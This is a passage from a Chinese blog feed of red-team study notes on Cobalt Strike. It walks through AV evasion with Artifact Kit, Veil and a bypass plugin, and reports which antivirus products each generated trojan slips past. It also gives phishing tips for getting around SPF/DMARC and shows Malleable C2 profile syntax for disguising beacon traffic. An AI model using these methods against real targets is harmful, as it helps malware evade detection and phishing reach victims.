中文翻译手册，感谢每篇笔记最后参考链接的作者们，感谢曾经帮助我解决所碰到问题的大佬们，谢谢你们。</p><p>最后，还有一点要注意的就是， <code>CS学习笔记</code>系列只是我个人在学习 Cobalt Strike 的过程中所做的笔记，建议不要当做教程看，因为其中我本身已经知道的知识点和感觉不重要知识点我是没有记录的。</p><p>将自己的笔记公开发出来的目的有二：一是便于自己遗忘时随时查找，这也是17年我建立这个公众号的主要目的；二是在笔记中我会记录一些坑的解决方法，如果你碰到和我一样的问题，或许我这小菜鸟写的笔记就能帮助到你。</p><blockquote><p>参考链接：<a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】27、apple渗透测试手法</title>
      <link href="//200419-150732.html"/>
      <url>//200419-150732.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在开始今天的内容之前，先来看看什么情况下会进行云查杀：</p><p>1、首先判断文件是否为正常文件</p><p>2、如果判断为可疑文件，则把文件的 hash 上传到云上</p><p>3、同时把这个文件标记为可疑文件，而不是正常文件</p><p>因此可以通过修改我们的脚本来使其跳过云查杀，就像是在白名单里的程序一样。</p><h1 id="0x01-Java-Applet"><a href="#0x01-Java-Applet" class="headerlink" title="0x01 Java Applet"></a>0x01 Java Applet</h1><p>接下来一起来看看 Cobalt Strike Java Applet 攻击，在 Cobalt Strike 的源码中内置了用于攻击 Java Applet 签名的 Applet 工具。</p><p>使用 Applet 工具的步骤如下：</p><p>1、到 <code>Help -&gt; Arsenal</code></p><p>2、如果需要的话就修改/混淆病毒文件 </p><p>3、使用代码签名证书进行签名</p><p>4、构建</p><p>5、使用 Applet Kit 加载脚本</p><p>大概在 2014 年 7 月，开始有人在钓鱼中使用宏攻击，在几年前，这是一种效果还很不错的攻击方式。</p><h1 id="0x02-应用程序白名单"><a href="#0x02-应用程序白名单" class="headerlink" title="0x02 应用程序白名单"></a>0x02 应用程序白名单</h1><p>站在防御者的角度，一个好的防御应该是列出只允许自己运行的应用程序白名单而不允许他人运行。对于攻击者则是使用白名单应用程序将代理放到内存中的方法来进行攻击，Java Applet 攻击就是这样做的。</p><p>一种攻击的方法是直接插入内存进行攻击。Java Applet、Office 宏、CS 下的 PowerShell 命令行都是这样做的。</p><p>一些白名单免杀的资料：</p><p><a href="https://twitter.com/subTee">https://twitter.com/subTee</a></p><p><a href="https://github.com/khr0x40sh/WhiteListEvasion">https://github.com/khr0x40sh/WhiteListEvasion</a></p><blockquote><p>注：由于以上只是我个人在学这一节时做的笔记，因此看起来可能会比较意识流，实际上视频中老师也是按照这个顺序讲解的。</p></blockquote><blockquote><p>参考链接：<a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】26、杀毒软件</title>
      <link href="//200419-150726.html"/>
      <url>//200419-150726.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这一节将来看看杀毒软件相关的概念，毕竟知己知彼才能百战不殆，最后会介绍一下常见的免杀方法。</p><h1 id="0x01-目的"><a href="#0x01-目的" class="headerlink" title="0x01 目的"></a>0x01 目的</h1><p>常规杀毒软件的目的就是发现已知病毒并中止删除它，而作为攻击者则需要对病毒文件进行免杀处理，从而使杀毒软件认为我们的文件是合法文件。</p><h1 id="0x02-杀软受到的限制"><a href="#0x02-杀软受到的限制" class="headerlink" title="0x02 杀软受到的限制"></a>0x02 杀软受到的限制</h1><p>1、杀毒软件不能把可疑文件删除或者结束运行，否则用户的正常操作可能就会受到影响，同时也会对杀毒软件公司的声誉、口碑产生影响。</p><p>2、杀毒软件不能占用太多的系统资源，否则用户可能会考虑卸载杀毒软件。</p><p>3、大多数杀毒软件的一个弱点就是只会在浏览器下载文件或者文件被写入磁盘时才会检查这个文件的特征码，也就是说在这种情况下才会检查文件是否是病毒。</p><h1 id="0x03-如何工作"><a href="#0x03-如何工作" class="headerlink" title="0x03 如何工作"></a>0x03 如何工作</h1><p>1、在大多数杀毒软件背后都会有一个已知病毒的签名数据库，通过将当前文件的特征码与病毒签名数据库进行比对，如果一致则说明该文件是病毒。</p><p>2、同时一些杀毒软件也会去发现用户的一些可疑行为，而且杀毒软件对这种可疑行为的判定会下比较大的功夫。因为如果误杀，造成的后果可能对用户来说是比较严重的。</p><p>3、一些杀毒软件会在沙箱环境中去运行可疑文件，然后根据该可疑文件的行为判断是否为病毒。</p><h1 id="0x04-如何免杀"><a href="#0x04-如何免杀" class="headerlink" title="0x04 如何免杀"></a>0x04 如何免杀</h1><p>首先要判断目标使用了哪款杀毒软件，然后自己在虚拟机中去尝试绕过它。</p><p>其次可以使用 Cobalt Strike 的 Artifact Kit 组件制作免杀可执行文件。Artifact Kit 是一个制作免杀 EXE、DLL 和 Service EXE 的源代码框架，在 Cobalt Strike 的 <code>Help --&gt; Arsenal</code> 处可下载 Artifact Kit。</p><p>Artifact Kit 的工作原理大概如下：</p><p>1、将病毒文件进行混淆处理，使杀毒软件将其判定为可疑文件而不是病毒文件。这种混淆可以逃避那些使用简单字符串搜索来识别恶意代码的杀毒软件。</p><p>2、对病毒文件进行一些处理，以绕过沙箱检测。比如 Artifact Kit 中的 src-common/bypass-pipe.c 会生成可执行文件和DLL，它们通过命名管道为自己提供shellcode。如果防病毒沙箱不能模拟命名管道，它将找不到已知的恶意 shellcode。</p><p>Artifact Kit 的使用步骤大概如下：</p><p>1、下载 Artifact Kit </p><p>2、如果需要的话就修改/混淆病毒文件 </p><p>3、构建</p><p>4、使用 Artifact Kit 加载脚本</p><h1 id="0x05-Artifact-Kit-使用演示"><a href="#0x05-Artifact-Kit-使用演示" class="headerlink" title="0x05 Artifact Kit 使用演示"></a>0x05 Artifact Kit 使用演示</h1><p>首先来看看未进行免杀处理的效果，这里采用 <a href="https://www.virustotal.com/">virustotal</a> 进行检测，发现被 42 个引擎检测到。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>接下来就试试 Artifact Kit 进行免杀的效果，有条件的可以去官网下载支持一下正版。</p><p>当然 Github 上也有人上传了，项目地址：<a href="https://github.com/Cliov/Arsenal">https://github.com/Cliov/Arsenal</a></p><p>这里使用 Artifact Kit 中的 dist-peek 方法进行测试。</p><p>来到 Cobalt Strike 下打开 <code>Cobalt Strike -&gt; Script Manager</code>，Load 加载 <code>/Arsenal/artifact/dist-peek/artifact.cna</code> 插件，之后在 <code>Attacks -&gt; Packages -&gt; Windows Executable</code> 中生成木马文件。</p><p>使用 VT 检测发现仅有 8 个引擎检测到，感觉效果好像还行。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-9.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>把每个杀软的病毒库升级到最新后，实测可以过腾讯电脑管家、火绒，但 360 安全卫士 、 360 杀毒不行。</p><blockquote><p>说句题外话，至于为什么用了两款 360 的产品，主要就是为了截图好看些。</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-10.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x06-Veil-Evasion-使用演示"><a href="#0x06-Veil-Evasion-使用演示" class="headerlink" title="0x06 Veil Evasion 使用演示"></a>0x06 Veil Evasion 使用演示</h1><p>此外，也可以使用 Veil Evasion 框架，Veil Evasion 的安装也是比较简单的，Veil-Evasion 在 Kali 2020以前是自带的，但 Kali 2020 中是需要独立安装的。在 Kali 中可以直接使用 apt-get 进行安装。</p><pre class="line-numbers language-none"><code class="language-none">git config --global http.proxy &#39;socks5:&#x2F;&#x2F;127.0.0.1:1080&#39;git config --global https.proxy &#39;socks5:&#x2F;&#x2F;127.0.0.1:1080&#39;apt-get install veil-evasionveil<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其他系统可以使用 veil-evasion 项目中的介绍进行安装，项目地址：<a href="https://github.com/Veil-Framework/Veil-Evasion">https://github.com/Veil-Framework/Veil-Evasion</a></p><p>由于 Veil Evasion 有 200 多 M ，因此建议挂上代理进行下载安装。</p><p>安装完成之后，在 Cobalt Strike 里的 <code>Attacks -&gt; Packages -&gt; Payload Generator</code>  中选择 Veil 输出生成一个 payload.txt 文件</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>随后来到 Kali 下，输入 <code>veil</code> 启动，输入 <code>use Evasion</code> 使用 Evasion 工具，<code>list</code> 查看当前可用的 Payload</p><pre class="line-numbers language-none"><code class="language-none">veiluse Evasionlist<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里使用第 17 个即 <code>go/shellcode_inject/virtual.py</code> Payload 作为示例，因为 go、c 等编译性语言语言相对于 python 等脚本语言来说免杀效果会好些。</p><pre class="line-numbers language-none"><code class="language-none">use 17<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后输入 <code>generate</code>，选择第三项 <code>Custom shellcode string</code> ，粘贴刚生成的 payload.txt 文本内容，输入要生成的 exe 文件名，即可生成一个免杀木马。</p><pre class="line-numbers language-none"><code class="language-none">generate3粘贴 payload.txt 内容bypass_go#生成文件的名称<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>使用 virustotal 查杀了一下生成的 bypass_go.exe，发现被 40 个引擎检测到，不得不说这效果很一般。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>实测可以过360 安全卫士、 360 杀毒，但腾讯电脑管家、火绒不行。</p><blockquote><p>看到 VT 的检测结果后，我还以为四款杀软都能检测到呢，没想到啊。</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-11.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x07-免杀插件"><a href="#0x07-免杀插件" class="headerlink" title="0x07 免杀插件"></a>0x07 免杀插件</h1><p>后来又在 GitHub 上发现一款免杀插件，2 个月前更新的，项目地址：<a href="https://github.com/hack2fun/BypassAV">https://github.com/hack2fun/BypassAV</a></p><p>使用方法可以参考项目中的介绍，目前效果感觉还是可以的，在 virustotal 上只被 10 个引擎检测到。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>实测可以过 360 安全卫士、360 杀毒、腾讯电脑管家，但火绒不行。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-8.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h1><p>在测试完成之后，开始体会到为什么要判断目标使用了哪款杀软的目的了，就上面测试的情况来说，每一家都出现未检测到的情况。在实际的环境中，还是要根据目标的具体情况具体分析。</p><blockquote><p>Emm，浏览器首页又被 360 改成 360 导航了。</p><p>另外不得不说一句，从使用的角度来说，火绒是这里面最乖的，没有其他杀毒软件那么多花花肠子。</p></blockquote><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p><a href="https://www.secpulse.com/archives/127186.html">https://www.secpulse.com/archives/127186.html</a></p><p><a href="https://www.cnblogs.com/backlion/p/10616308.html">https://www.cnblogs.com/backlion/p/10616308.html</a></p><p><a href="https://lunamoore.github.io/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/">https://lunamoore.github.io/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】25、邮件防御</title>
      <link href="//200419-150719.html"/>
      <url>//200419-150719.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Cobalt Strike 不是什么工作情况都能胜任的工具，因此就需要我们根据不同的情况去做一些辅助工作。</p><p>最后这几节将学习免杀部分的东西，这一节将主要介绍邮件防御方面的相关概念。</p><h1 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h1><h2 id="1、SPF、DKIM、DMARC"><a href="#1、SPF、DKIM、DMARC" class="headerlink" title="1、SPF、DKIM、DMARC"></a>1、SPF、DKIM、DMARC</h2><p>SPF、DKIM、DMARC 都是邮件用于帮助识别垃圾信息的附加组件，那么作为一个攻击者，在发送钓鱼邮件的时候，就需要使自己的邮件能够满足这些组件的标准，或者发送到未配置这些组件的域。</p><p>在理解这些防御标准前，需要先理解如何在因特网上通过 SMTP 发送邮件。</p><h2 id="2、SMTP"><a href="#2、SMTP" class="headerlink" title="2、SMTP"></a>2、SMTP</h2><p>发送一封邮件的过程大概是下面这个样子，这里以QQ邮箱为例。</p><pre class="line-numbers language-none"><code class="language-none">&gt; telnet smtp.qq.com 25HELO teamssixauth loginbase64编码后的邮箱名base64编码后的授权码MAIL FROM: &lt;evil_teamssix@qq.com&gt;RCPT TO: &lt;target_teamssix@qq.com&gt;DATA邮件内容.QUIT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-防御策略"><a href="#0x02-防御策略" class="headerlink" title="0x02 防御策略"></a>0x02 防御策略</h1><h2 id="1、SPF"><a href="#1、SPF" class="headerlink" title="1、SPF"></a>1、SPF</h2><p>SPF <code>Sender Policy Framework</code> 发送人策略框架，SPF 主要用来防止随意伪造发件人。其做法就是设置一个 SPF 记录，SPF 记录实际上就是 DNS 的 TXT 记录。</p><p>如果邮件服务器收到一封来自 IP 不在 SPF 记录里的邮件则会退信或者标记为垃圾邮件。</p><p>我们可以使用以下命令查看目标的 SPF 记录。</p><pre class="line-numbers language-none"><code class="language-none">dig +short TXT target.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; dig +short TXT qq.com&quot;v&#x3D;spf1 include:spf.mail.qq.com -all&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上面的 <code>include:spf.mail.qq.com</code> 表示引入<code>spf.mail.qq.com</code>域名下的 SPF 记录。</p><pre class="line-numbers language-none"><code class="language-none">&gt; dig +short TXT spf-a.mail.qq.com&quot;v&#x3D;spf1 ip4:203.205.251.0&#x2F;24 ip4:103.7.29.0&#x2F;24 ip4:59.36.129.0&#x2F;24 ip4:113.108.23.0&#x2F;24 ip4:113.108.11.0&#x2F;24 ip4:119.147.193.0&#x2F;24 ip4:119.147.194.0&#x2F;24 ip4:59.78.209.0&#x2F;24 ip4:113.96.223.0&#x2F;24 ip4:183.3.226.0&#x2F;24 ip4:183.3.255.0&#x2F;24 ip4:59.36.132.0&#x2F;24 -all&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上面的 <code>ip4:203.205.251.0/24 ip4:103.7.29.0/24</code> 表示只允许这个范围内的 IP 发送邮件。</p><h2 id="2、DKIM"><a href="#2、DKIM" class="headerlink" title="2、DKIM"></a>2、DKIM</h2><p>DKIM <code>DomainKeys Identified Mail</code> 域名密钥识别邮件，DKIM 是一种防范电子邮件欺诈的验证技术，通过消息加密认证的方式对邮件发送域名进行验证。</p><p>邮件接收方接收邮件时，会通过 DNS 查询获得公钥，验证邮件 DKIM 签名的有效性，从而判断邮件是否被篡改。</p><h2 id="3、DMARC"><a href="#3、DMARC" class="headerlink" title="3、DMARC"></a>3、DMARC</h2><p>DMARC <code>Domain-based Message Authentication, Reporting &amp; Conformance</code> 基于域的消息认证，报告和一致性。</p><p>它用来检查一封电子邮件是否来自所声称的发送者。DMARC 建立在 SPF 和 DKIM 协议上, 并且添加了域名对齐检查和报告发送功能。这样可以改善域名免受钓鱼攻击的保护。</p><p>可以使用下面的命令查看目标的的 DMARC 记录。</p><pre class="line-numbers language-none"><code class="language-none">dig +short TXT _dmarc.target.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; dig +short TXT _dmarc.qq.com&quot;v&#x3D;DMARC1; p&#x3D;none; rua&#x3D;mailto:mailauth-reports@qq.com&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也有一些在线网站支持检测 SPF、DKIM、DMARC 的记录，比如 <a href="https://dmarcly.com/tools/">https://dmarcly.com/tools/</a></p><p>关于这些记录查询返回结果的解释可参考文章末的参考链接。</p><h1 id="0x03-发送钓鱼邮件的一些注意事项"><a href="#0x03-发送钓鱼邮件的一些注意事项" class="headerlink" title="0x03 发送钓鱼邮件的一些注意事项"></a>0x03 发送钓鱼邮件的一些注意事项</h1><p>1、检测目标是否有 SPF 记录，如果有则可能会被拦截</p><p>2、检测目标 DMARC 记录的 p 选项是否为 reject ，如果有则可能会被拒绝</p><p>3、模板中嵌入的 URL 地址，不要使用 IP 地址，要保证使用完整的 URL地址</p><p>4、邮件的附件中不能附上一些可执行文件，比如 exe 格式的文件，因为一些邮件过滤器可能会将这些可执行文件删除</p><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p><a href="https://segmentfault.com/a/1190000019290085">https://segmentfault.com/a/1190000019290085</a></p><p><a href="https://www.cnblogs.com/cthon/p/9151467.html">https://www.cnblogs.com/cthon/p/9151467.html</a></p><p><a href="https://www.renfei.org/blog/introduction-to-spf.html">https://www.renfei.org/blog/introduction-to-spf.html</a></p><p><a href="https://blog.csdn.net/qq_34101364/article/details/108062913">https://blog.csdn.net/qq_34101364/article/details/108062913</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】24、C2lints实例演示</title>
      <link href="//200419-150712.html"/>
      <url>//200419-150712.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>续上一节，在GitHub 上有一些配置文件的示例，项目地址：<a href="https://github.com/rsmudge/Malleable-C2-Profiles">https://github.com/rsmudge/Malleable-C2-Profiles</a></p><p>这一节将使用该项目中的 <code>Malleable-C2-Profiles/APT/havex.profile</code> 配置文件作为示例。</p><h1 id="0x01-测试配置文件是否有效"><a href="#0x01-测试配置文件是否有效" class="headerlink" title="0x01 测试配置文件是否有效"></a>0x01 测试配置文件是否有效</h1><p>可以使用 c2lint 工具对配置文件进行测试，以判断配置文件编写的是否有效。</p><p>来到 cobalt strike 目录下，可以看到有一个 c2lint 文件，该文件需要在 Linux 下运行。</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;c2lint [profile]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在运行的结果中，绿色正常（这里更像青色），黄色告警，红色错误，比如运行 <code>Malleable-C2-Profiles</code> 项目里的 <code>havex.profile</code> 文件。</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;c2lint .&#x2F;Malleable-C2-Profiles&#x2F;APT&#x2F;havex.profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs24-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>当配置文件存在错误的时候，就会以红色显示出来</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs24-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x02-运行-teamserver"><a href="#0x02-运行-teamserver" class="headerlink" title="0x02 运行 teamserver"></a>0x02 运行 teamserver</h1><pre class="line-numbers language-none"><code class="language-none">.&#x2F;teamserver [teamserver_ip] [teamserver_password] [profile]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;teamserver 192.168.12.2 password .&#x2F;Malleable-C2-Profiles&#x2F;APT&#x2F;havex.profile[*] Will use existing X509 certificate and keystore (for SSL)Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings&#x3D;on -Dswing.aatext&#x3D;true[+] I see you&#39;re into threat replication. .&#x2F;Malleable-C2-Profiles&#x2F;APT&#x2F;havex.profile loaded.[+] Team server is up on 50050<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里调用的 havex.profile 配置文件，该配置文件里对 cookie 进行了 base64 编码。</p><p>开启 cobalt strike 后，使主机上线，通过 wireshark 抓包可以发现数据包确实符合这些特征。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs24-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>关于 Malleable C2 文件的使用，这里只是大概记录了一些，想了解更多关于 Malleable C2 文件的内容或者注意事项等，可以参考 A-TEAM 团队的 CS 4.0 用户手册。</p><blockquote><p>参考链接：<a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】23、malleable命令</title>
      <link href="//200419-150704.html"/>
      <url>//200419-150704.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这节课将来看看如何优化 CS 的攻击载荷，从而使它更方便、隐蔽些。</p><h1 id="0x01-malleable-命令和控制"><a href="#0x01-malleable-命令和控制" class="headerlink" title="0x01 malleable 命令和控制"></a>0x01 malleable 命令和控制</h1><p>malleable 是一种针对特定领域的语言，主要用来控制 Cobalt Strike Beacon</p><p>在开启 teamserver 时，在其命令后指定配置文件即可调用，比如：</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;teamserver [ip address] [password] [profile]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x02-编写配置文件"><a href="#0x02-编写配置文件" class="headerlink" title="0x02 编写配置文件"></a>0x02 编写配置文件</h1><h2 id="1、定义事务指标"><a href="#1、定义事务指标" class="headerlink" title="1、定义事务指标"></a>1、定义事务指标</h2><pre class="line-numbers language-none"><code class="language-none">http-get &#123;# 指标&#125;http-post &#123;# 指标&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、控制客户端和服务端指标"><a href="#2、控制客户端和服务端指标" class="headerlink" title="2、控制客户端和服务端指标"></a>2、控制客户端和服务端指标</h2><pre class="line-numbers language-none"><code class="language-none">http-get &#123;client &#123;# 指标&#125;server &#123;# 指标&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、set-操作"><a href="#3、set-操作" class="headerlink" title="3、set  操作"></a>3、set  操作</h2><p>set 语句是给一个选项赋值的方法，以分号结束。</p><pre class="line-numbers language-none"><code class="language-none">set useragent &quot;Mozilla&#x2F;5.0 (compatible; MSIE 8.0; Windows NT 5.1)&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>malleable 给了我们很多选项，比如：</p><pre class="line-numbers language-none"><code class="language-none">jitter# 控制 beacon 默认回连的抖动因子maxdns# 控制最大 DNS 请求，限制最大数量可以使 DNS Beacon 发送数据看起来正常些sleeptime# 控制 beacon 的全部睡眠时间spawntouriuseragent# 控制每次发送请求的 useragent<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>sleeptime</code> 和 <code>jitter</code> 两个选项是很重要的</p><h2 id="4、添加任意-headers"><a href="#4、添加任意-headers" class="headerlink" title="4、添加任意 headers"></a>4、添加任意 headers</h2><pre class="line-numbers language-none"><code class="language-none">header &quot;Accept&quot; &quot;text&#x2F;html,application&#x2F;xhtml&quot;;header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.google.com&quot;;header &quot;Progma&quot; &quot;no-cache&quot;;header &quot;Cache-Control&quot; &quot;no-cache&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5、其他指标"><a href="#5、其他指标" class="headerlink" title="5、其他指标"></a>5、其他指标</h2><pre class="line-numbers language-none"><code class="language-none">header &quot;header&quot; &quot;value&quot;;parameter &quot;key&quot; &quot;value&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="6、转换-存储数据"><a href="#6、转换-存储数据" class="headerlink" title="6、转换/存储数据"></a>6、转换/存储数据</h2><pre class="line-numbers language-none"><code class="language-none">metadata &#123;    netbios;    append &quot;-.jpg&quot;;    uri-append;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img 